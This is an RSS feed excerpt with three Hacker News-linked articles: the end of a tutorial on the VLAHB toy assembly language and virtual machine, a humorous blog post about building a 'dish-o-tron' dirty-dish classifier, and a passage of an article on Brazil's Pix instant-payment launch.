ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>×</b>, <b>÷</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2
ADD R[33] 1
GTE R[0] 2
ADD R[33] 1
ADD R[33] 2

EXIT
</code></pre>

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

    <pre><code>LD R[4101] 0XFF0000FF // red
LD R[4102] 0X00FF00FF // green
LD R[4103] 0X0000FFFF // blue
BLIT

INFINITE_LOOP_2:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP_2  // loop forever
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_3px.png"></p><h2>Write an Assembly Game</h2>

    <ul>
        <li>Clone the repo from <a href="https://github.com/Kully/VLAHB">Github</a></li>
        <li>Read <a href="https://github.com/Kully/VLAHB/blob/master/README.md">README.md</a></li>
    </ul>

    <h4>Tips</h4>

    <ol>
        <li>See <a href="https://github.com/Kully/VLAHB/blob/master/asm/pong.asm">pong.asm</a> for a reference on how to code user input into a game. The <b>INPUT</b> and <b>SHT</b> opcodes are necessary for this.</li>

        <li>Use <i>C</i> syntax highlighting for your text editor for asm files.</li>

        <li>Checkout <a href="https://github.com/Kully/VLAHB/blob/master/asm/sprites.asm">sprite.asm</a> in the repo. It contains 5X5 px sprites for numbers 0-9 and letters A-Z.</li>

        <li>Slots 27141-65535 have no special designation and are free to use for anything you want. You can store variables, perform arithmetic, etc.</li>
    </ol>


    <h4>Debugging</h4>

    <p>Run the following in your terminal to get a 4 byte wide hexdump of the binary file vlahb generated above.</p>

    <pre><code>
$ xxd -c 4 bin/file.bin
    </code></pre>

    <p><img src="http://adamkulidjian.com/imgs/xxd_output.png"></p><p>You can see debug messages as you run <i>vm.c</i> by changing <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L17">this line</a> to <b>#define DEBUG 1</b>. Warning: it is very slow.</p>

    <p><img src="http://adamkulidjian.com/imgs/debug_in_vm.png"></p><h2>Thank You!</h2>

    <p>Thank you taking the time to read and as always. <b>Feedback is highly …</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://adamkulidjian.com/vlahb.html">http://adamkulidjian.com/vlahb.html</a></em></p>]]>
            </description>
            <link>http://adamkulidjian.com/vlahb.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942137</guid>
            <pubDate>Fri, 30 Oct 2020 13:49:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dish-o-tron – an ironic (hopefully) fun deep learning tutorial]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24942115">thread link</a>) | @mamikl
<br/>
October 30, 2020 | https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/ | <a href="https://web.archive.org/web/*/https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Sadly, to tell you the truth, doing dishes is still a thing. However, so far most of our readers still like our non-standard Deep Learning tutorial.</em></p><p>Typically, AI is demonstrated as solving various toy problems. AI plays chess and Go, AI plays video games, AI makes people dance. It is time to stop this madness and finally apply AI in a meaningful way. Therefore, we proudly present the dish-o-tron. The dish-o-tron is an AI system designed to solve an actual real-world problem impacting millions of people around the world every day: facing dirty dishes in the community kitchen sink.</p><div id="attachment_77683"><p><a href="https://blog.codecentric.de/files/2020/09/real_world_problem.png"><img aria-describedby="caption-attachment-77683" loading="lazy" src="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png" alt="dirty dishes in the community kitchen sink" width="250" height="107" srcset="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png 250w, https://blog.codecentric.de/files/2020/09/real_world_problem-700x300.png 700w, https://blog.codecentric.de/files/2020/09/real_world_problem-768x329.png 768w, https://blog.codecentric.de/files/2020/09/real_world_problem-1536x659.png 1536w, https://blog.codecentric.de/files/2020/09/real_world_problem-120x51.png 120w, https://blog.codecentric.de/files/2020/09/real_world_problem.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77683">dirty dishes in the community kitchen sink – a real-world problem</p></div><p>Reading this blog series will equip you with the ultimate power to solve this long-lasting problem in your community kitchen once and for all by using state-of-the-art AI technology.</p><h2>The dish-o-tron</h2><p>At first glance, the dish-o-tron is an inconspicuous, well-positioned webcam in the kitchen observing the shared kitchen sink. In its natural state the dish-o-tron is just happy and enjoys life. The dish-o-tron doesn’t care whether you prefer tea or coffee and it likes all kinds of kitchen talk. However, there is one single thing that the dish-o-tron absolutely hates: watching someone put dirty dishes in the community sink.</p><p>Detecting dirty dishes in the sink enrages the peace-loving dish-o-tron so much that it starts beeping. The only way to return it to its natural peaceful state and thus stopping the noise is to admit one’s mistake and remove all dirty dishes from the community sink, leaving it neat and clean again.</p><div id="attachment_78576"><p><a href="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen.png"><img aria-describedby="caption-attachment-78576" loading="lazy" src="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-250x166.png" alt="respect privacy in the kitchen" width="250" height="166" srcset="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-250x166.png 250w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-700x465.png 700w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-768x510.png 768w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-1536x1020.png 1536w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-120x80.png 120w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen.png 1984w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-78576">privacy in the kitchen has to be respected.</p></div><p>Building the dish-o-tron requires three high-level steps:</p><ul><li>Gathering and preparing data</li><li>Training an AI model</li><li>Deployment of the model</li></ul><p>In the following, we will discuss these steps further.</p><h2>Gathering and preparing data</h2><p>Trying to solve real-world problems with AI often starts with the realisation that there is little or even no data available. This issue prevents many problem solvers from actually solving the problem. “If only data collection had started years ago!”, they say, “then we could now actually solve the problem”. While this is a reasonable thought, it simply doesn’t help.</p><p>Consoling users currently facing a problem by saying that it is necessary to gather lots of data for quite some time before we can start building a solution is at least challenging. Typically a more promising approach is to build a system addressing the problem which is able to improve over time.</p><p>In this way, we will not solve the problem completely in the first step; however, we will tackle the problem right away and put ourselves in a position to iteratively adjust the solution to match the requirements which also become more and more clear while working on the problem.</p><p>Since our problem is unique in a sense that there is no Kaggle dataset readily available, we start our journey to building the dish-o-tron by doing our best to collect a suitable dataset for a first working system. Here, we will make videos of various kitchen sinks clean and not clean and split them up into a first labeled dataset.</p><p>In this way, we started collecting the DIRTY-DISHES-DATASET with thousands of pictures that we will share with you in the next article.</p><div id="attachment_77687"><p><a href="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png"><img aria-describedby="caption-attachment-77687" loading="lazy" src="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png" alt="sample images from the dirty-dishes dataset" width="250" height="151" srcset="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png 250w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-700x424.png 700w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-768x465.png 768w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-120x73.png 120w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png 1004w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77687">sample images from the dirty-dishes dataset</p></div><h2>Training an AI model</h2><p>Not so long ago, training an AI model was tedious and required expert knowledge. In many cases this is still true today. Depending on the problem, we have to figure out a suitable model architecture and feature engineering and this requires some experimentation before we can train a suitable AI model. This is another issue which prevents problem solvers from building a solution tackling the whole problem even if data is available.</p><p>Fortunately, image classification is one of the best understood use cases in AI. There are lots of established best practices regarding model architectures and training of models. Among others this led to two things:</p><ul><li>High-level software libraries such as fast.ai which abstract away lots of the nitty-gritty details of image classification, providing a black-box kind of approach where state-of-the-art practises are simply utilised without burdening the user with the details.</li><li>Machine Learning as a service offerings from various public cloud providers such as automl and rekognition allowing training of image classification models on custom data in a few simple steps.</li></ul><p>Both approaches will typically not lead to the absolutely best solution. However, most of the time this is not necessary and ‘good enough’ will be just fine and a nice trade-off between time &amp; money spent vs. result. For our first version of the dish-o-tron, we will employ the <a href="https://cloud.google.com/automl" target="_blank" rel="noopener noreferrer">AutoML Service</a> from Google Cloud to train a first model.</p><p>We can use various tools to inspect the model and try to explain if the black box learns what we expect.</p><div id="attachment_77689"><p><a href="https://blog.codecentric.de/files/2020/09/explain_model.png"><img aria-describedby="caption-attachment-77689" loading="lazy" src="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png" alt="visualizing what the dish-o-tron model has actually learned" width="250" height="191" srcset="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png 250w, https://blog.codecentric.de/files/2020/09/explain_model-700x535.png 700w, https://blog.codecentric.de/files/2020/09/explain_model-768x587.png 768w, https://blog.codecentric.de/files/2020/09/explain_model-120x92.png 120w, https://blog.codecentric.de/files/2020/09/explain_model.png 1412w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77689">Visualizing what the model has actually learned.</p></div><p>The training of the AI model with AutoML and its technical details will be discussed in a follow-up blog post.</p><h2>Deployment of the model</h2><p>Having an AI model generally will not solve an actual real-life problem. For a viable solution, the AI model has to be integrated into a suitable context. Many times, this is the key step to generating any value at all. Nevertheless, this step is often postponed to the distant future after “collecting high quality data” and “building the best AI model”. This is, more often than not, a mistake because integrating the model into its context poses various challenges on its own. Hence, it should not be ignored and instead tackled early in order to learn and identify the associated challenges.</p><p>While building the dish-o-tron, we tried multiple options to run the model. We deployed it on a Pi Zero which is a really small and cheap device that can be glued anywhere with a small powerbank. But it is rather slow. We ran the model in the browser using our notebook’s webcam with TensorFlow.js. We used the Google AIY Kit, which is much faster than the Pi Zero and also comes with a beeper and blinking lights (but it is quite old and deploying state-of-the-art models is hacky). Finally, we used the Google Coral device, which is made for this kind of workload and well-integrated into Google AutoML but comes with a price tag.</p><p>The community kitchen is a special place. It’s a place where rumors are born, where gossip is produced and where you can openly chat about the most secret secrets of your company! That’s why dish-o-tron is living on the edge. Edge devices enable you to run audio and video analytics AND respect the privacy of your community kitchen. No image is transferred to the cloud. Nothing is saved. Dish-o-tron sees and forgets.</p><div id="attachment_77691"><p><a href="https://blog.codecentric.de/files/2020/09/various_edge_devices.png"><img aria-describedby="caption-attachment-77691" loading="lazy" src="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png" alt="various edge devices" width="250" height="85" srcset="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png 250w, https://blog.codecentric.de/files/2020/09/various_edge_devices-700x237.png 700w, https://blog.codecentric.de/files/2020/09/various_edge_devices-768x261.png 768w, https://blog.codecentric.de/files/2020/09/various_edge_devices-1536x521.png 1536w, https://blog.codecentric.de/files/2020/09/various_edge_devices-2048x695.png 2048w, https://blog.codecentric.de/files/2020/09/various_edge_devices-120x41.png 120w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77691">Various edge devices</p></div><p>Moreover, the hardware we consider and buy in order to actually build the dish-o-tron will establish basic conditions for our solution space. In other words, we have to mind that it is possible to painlessly deploy the AI model on our preferred edge device. For the first version of the dish-o-tron, we decided to use a Google AIY kit (see video below). For the next version, we chose a Google Coral edge device, which allows us to run advanced computer vision tasks on a Raspberry-size mini computer. Fortunately, AutoML allows us to export models in a viable format.</p><div id="attachment_77693"><p><a href="https://blog.codecentric.de/files/2020/09/google_coral_device.png"><img aria-describedby="caption-attachment-77693" loading="lazy" src="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png" alt="Google coral device" width="250" height="131" srcset="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png 250w, https://blog.codecentric.de/files/2020/09/google_coral_device-700x366.png 700w, https://blog.codecentric.de/files/2020/09/google_coral_device-768x401.png 768w, https://blog.codecentric.de/files/2020/09/google_coral_device-1536x803.png 1536w, https://blog.codecentric.de/files/2020/09/google_coral_device-120x63.png 120w, https://blog.codecentric.de/files/2020/09/google_coral_device.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77693">Google coral device</p></div><p>The construction of the dish-o-tron including the deployment of the model on the Coral device and its technical details will be discussed in an upcoming blog post.</p><h2>Conclusion</h2><p>AI research has brought us new technology that can solve problems that couldn’t be solved before. Have you read the book <em>AI superpowers</em> by Kai-Fu Lee? He says that you don’t need to be one of the best AI researchers any more to apply AI and find new business opportunities. You need to collect (lots of) data and can “just” use existing algorithms, services and open source frameworks. Well, in our opinion building AI solutions is not easy – but it is indeed getting easier and easier every day.</p><p>See the first prototype running on the google AIY kit here (mind the green/red LED at the box):</p><p>Follow this blog series if you want to know how to build and run such a model on an edge device yourself. Building the dish-o-tron will fundamentally change the way you experience the community kitchen. Instead of being a place of constant anger and hostility, the community kitchen will become a peaceful meeting ground for sharing ideas and connecting with co-workers.</p><p>In the upcoming blog posts, we will guide you through the process of building your own dish-o-tron for your community kitchen sink. Hence, we will tackle a real-world problem and playfully learn how to build and improve an AI system from scratch. Stay tuned!</p><p>Continue with the <a href="https://blog.codecentric.de/en/2020/09/dish-o-tron-gather-that-data-you-must/">the second part of our series</a> where we start with gathering data.</p></div></div>]]>
            </description>
            <link>https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942115</guid>
            <pubDate>Fri, 30 Oct 2020 13:46:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brazil will launch its first nationwide digital instant-payment system]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942060">thread link</a>) | @imartin2k
<br/>
October 30, 2020 | https://restofworld.org/2020/cash-debit-or-pix/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cash-debit-or-pix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Next month, Brazil will launch its first nationwide digital instant-payment system. On November 16, Pix will go live on banking apps, digital wallets, and other services throughout Latin America’s largest financial market.&nbsp;</p>



<p>Pix was created by Brazil’s <a href="https://content.next.westlaw.com/w-006-8837?transitionType=Default&amp;contextData=(sc.Default)&amp;__lrTS=20191105091102789&amp;firstPage=true">Central Bank</a>, which has the power of life and death over all Brazilian financial institutions. The system is virtually free to use, a novelty in a country with a very efficient but expensive banking system.</p>



<p>Although it will be mandatory only for the largest banks, Pix will be available for all Brazilians whose bank or credit union opts in. Already, people are embracing the new system; on the first registration day ahead of launch, <a href="https://neofeed.com.br/blog/home/no-pix-uma-lista-e-a-chave-da-discordia-entre-bancos-e-fintechs/">millions of users</a> signed up for the service.&nbsp;</p>



<p>But not everyone is so enthusiastic. Pix’s simplicity and low cost will eat into the revenue streams of big banks, which typically charge users for fast transfers. It also complicates the business models of some of Brazil’s most successful startups. And by combining these features with a countrywide mandate, Pix might finally accomplish something that up until a few years ago was unthinkable: killing cash transactions in Brazil.</p>



<h3><strong>Why did the Brazilian Central Bank create Pix?</strong></h3>



<p>Pix has been in the works<a href="https://www.bcb.gov.br/estabilidadefinanceira/gtpaginst_reunioes"> since mid-2018</a>. Back then, there were a few instant-payment systems available in Brazil. Yet those that did exist were either limited to a specific bank’s clientele or had been launched by startups.&nbsp;</p>



<div><p>“We had been signaling the need for instant payments to the market since 2013,” said Mayara Yano, an analyst at the Central Bank. But, according to Yano, there were too many barriers and not enough incentives for a private company to create a service to be adopted by the banking system as a whole.</p><p>With Pix, the Central Bank also means to restrain the use of paper money, still popular in everyday life. It’s typical of mom and pop shops to offer 5% to 10% discounts for cash payments to avoid card-processing fees, for example.</p></div>



<p>Limiting paper currency with Pix would help the Central Bank with two other problems: limit its expenses with producing and distributing bills and coins, and boost the government’s investigations of financial fraud, <a href="https://www.bloomberg.com/news/articles/2020-10-07/bolsonaro-declares-brazil-corruption-free-and-ends-carwash-probe">a hot-button issue in Brazil</a>. After all, cash transactions are almost impossible to track, but Pix payments will be all saved in their users’ banking apps.<br></p>



<p>Pix isn’t the first government-imposed payment mandate in Brazil’s history. In 2002, the Central Bank created a money transfer mechanism that took less than one hour on weekdays and would be completed by the next working day on weekends and holidays. The mechanism, called TED, was mandatory for all banks.</p>



<p><br>Pix, of course, isn’t mandatory for everybody. But it may as well be, since it is mandatory for banks with more than 500,000 clients; the group comprises 34 banks, which serve 90% of the <a href="https://www1.folha.uol.com.br/mercado/2020/10/pandemia-leva-a-bancarizacao-de-quase-10-milhoes-de-pessoas.shtml">175.4 million Brazilians who own bank accounts</a>. It is optional for smaller banks, fintech startups, credit unions, and other financial service providers.</p>



<h3><strong>How will it work?</strong></h3>



<div><p>Pix relies on identifiers like QR codes, email addresses, and telephone numbers to perform money transfers in up to 10 seconds, including on weekends and holidays. It will be incorporated into banking and payment apps, digital wallets, and other kinds of financial services. Once available, Pix will provide an alternative to existing fast money transfers, which cost an average of 10 Brazilian reais each in fees ($2).</p><p>The system functions virtually for free<strong>; </strong>the Central Bank charges financial institutions just 1 Brazilian centavo ($0.0018) for every 10 Pix transactions, and it’s up to them if they will pass along that cost to their clients.</p><p>To sign up, a user must submit up to five pieces of personal information, such as an email address, a cell phone number, or a tax ID, that will be used as a “Pix key” to identify them in a money transfer. Users will also be given a QR code, which can be used to send or receive payments. If they have a bank account, they can use their checking account information to process a Pix transaction, much like a traditional bank transfer.</p></div>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-40x79.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-400x786.jpg 400w, https://restofworld.org/wp-content/uploads/2020/10/pix-registry3-600x1180.jpg 600w, " sizes="300px" alt="During the sign-up, users need to enroll a key (" chaves="" pix")="" consisting="" of="" a="" piece="" personal="" information."="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>How will Pix affect Brazilian banks and fintech startups?</strong></h3>



<p>The government hasn’t disclosed any studies of how Pix could impact Brazil’s economy. But it’s clear that the new technology will hit big banks the hardest, as well as big-name payment intermediaries, like point-of-sale and card-machine operators Cielo and Rede. German consulting group Roland Berger forecasts that the latter could lose up to <a href="https://valorinveste.globo.com/mercados/renda-variavel/empresas/noticia/2020/07/03/pix-tira-ate-r-13-bi-de-credenciadoras.ghtml"></a><a href="https://valorinveste.globo.com/mercados/renda-variavel/empresas/noticia/2020/07/03/pix-tira-ate-r-13-bi-de-credenciadoras.ghtml">13 billion reais</a> ($2.6 billion).&nbsp;</p>



<p>Pix also threatens what has been a lucrative revenue stream for Brazil’s “Big Five” banks — Itaú, Bradesco, Santander, Banco do Brasil, and Caixa Econômica Federal — which collectively make 2.2 billion reais ($440 million) a year from fees for same-day money transfers.</p>







<p>But a potential loss in transfer revenues isn’t the only danger to the Big Five. Now that they’re on the same footing when it comes to transfer fees, they risk losing clients to digital wallets and online-only banks. As of 2019, more than <a href="https://www.bcb.gov.br/content/publicacoes/relatorioeconomiabancaria/REB_2019.pdf">80% of Brazil’s total credit operations</a>, valued at 2.90 trillion reais ($580 billion), were concentrated in the Big Five. “Pix will challenge the entire market to provide quality digital services at lower prices,” said Cláudio Guimarães Júnior, executive director of the Brazilian Association of Banks.&nbsp;</p>



<p>Traditional banks such as Itaú e Bradesco<a href="https://einvestidor.estadao.com.br/ultimas-noticias/itau-e-do-bradesco-chamam-atencao-para-seguranca-e-defendem-pix"> have voiced concerns</a> about the system’s security and complained that the launch date is too early. “[Battling Pix] is like trying to stop the wind with your hands,” said João Bragança, specialist in payment methods at Roland Berger.&nbsp;</p>



<div><p>But the effects of Pix could cut both ways. Established digital payment startups like <a href="https://labsnews.com/en/news/business/brazilian-instant-payment-pix-will-allow-withdrawals-in-retail-stores/">PicPay</a>, with its 20 million active users, and <a href="https://www.nasdaq.com/articles/brazils-pagseguro-digital-raises-23-billion-ipo-stock-jumps-2018-01-24">PagSeguro</a>, which raised about 13.2 billion reais ($2.3 billion) during its initial public offering on Nasdaq, may be in trouble. One of their services is instant digital payments, something Pix will provide universally and for free.</p><p>But whether you’re a big bank or a small fintech firm, there’s no fighting the Central Bank. The Brazilian government will also allow big retailers to adopt Pix as a payment option, often with cashback offers, a novelty in Brazil. In order to compete, PicPay and other digital-payment companies will need to diversify their services.&nbsp;</p></div>






		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-40x20.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-400x200.png 400w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-600x299.png 600w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-1000x499.png 1000w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-1600x798.png 1600w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-2800x1397.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="The system will mitigate cost for end-users and charge 0.001 reais per transaction from the banks and fintech.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder"><a href="https://www.bcb.gov.br/estabilidadefinanceira/negociopix" target="_blank" rel="noopener noreferrer">https://www.bcb.gov.br</a></span>
			</figcaption>
		</figure>


<h3><strong>What will change for Brazilians?</strong></h3>



<p>Even with Brazilians being as fond of cash as they are now, financial experts are expecting Pix to gain a stranglehold on non-cash payments and money transfers within the next few years. An analysis by Accenture anticipates some <a href="https://labsnews.com/en/articles/technology/brazils-instant-payments-system-can-reach-20-million-users-in-its-first-year/">48 billion reais</a> ($9.6 billion) to move through the Pix system by the end of its first year.&nbsp;</p>



